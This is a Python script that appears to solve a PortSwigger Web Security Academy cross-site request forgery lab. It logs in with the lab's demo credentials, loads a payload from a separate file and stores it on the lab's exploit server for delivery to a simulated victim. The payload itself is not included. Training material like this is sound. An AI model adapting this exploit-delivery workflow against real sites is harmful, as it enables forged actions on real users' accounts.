from requests import Session
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from os import path
from urllib3 import disable_warnings, exceptions


def lab(url, exploit_server):
    session = Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"})
    session.verify = False
    session.stream = False

    username_encoded = 'wiener'
    password_encoded = 'peter'
    data = f'username={username_encoded}&password={password_encoded}'

    response = session.post(url=f'{url}/login', data=data, allow_redirects=False)

    if response.status_code != 302:
        return

    cookies = response.cookies

    with open(path.join(path.dirname(__file__), 'payload.txt')) as lines:
        file = ''
        head = ''
        body = ''
        for line in lines:
            if '§file' in line:
                is_file_payload = True
                is_head_payload = False
                is_body_payload = False
            if '§head' in line:
                is_file_payload = False
                is_head_payload = True
                is_body_payload = False
            if '§body' in line:
                is_file_payload = False
                is_head_payload = False
                is_body_payload = True

            if is_file_payload:
                file += line
            if is_head_payload:
                head += line
            if is_body_payload:
                body += line

            file = file.replace('§file\n', '')
            head = head.replace('§head\n', '')
            body = body.replace('§body\n', '')

        action = 'STORE'
        session.post(
            url=f'{exploit_server}/',
            data=f'urlIsHttps=on&responseFile={file}&responseHead={head}&responseBody={body}&formAction={action}',
            allow_redirects=False
        )

    print('Click "My account", open exploit server then click "View exploit" or "Deliver exploit to victim"')

    options = Options()
    options.add_argument('-no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--start-maximized')
    options.add_experimental_option('detach', True)
    driver = webdriver.Chrome(options=options)
    driver.get(f'{url}/my-account')
    for cookie in cookies:
        driver.add_cookie({
            'name': cookie.name,
            'value': cookie.value
        })


# CSRF vulnerability with no defenses
# https://portswigger.net/web-security/csrf/lab-no-defenses
if __name__ == '__main__':
    disable_warnings(exceptions.InsecureRequestWarning)

    lab(
        'https://0a010079033937fc82ea10d000d500e4.web-security-academy.net',
        'https://exploit-0acb001503c4376782770f6b01fe00ba.exploit-server.net'
    )
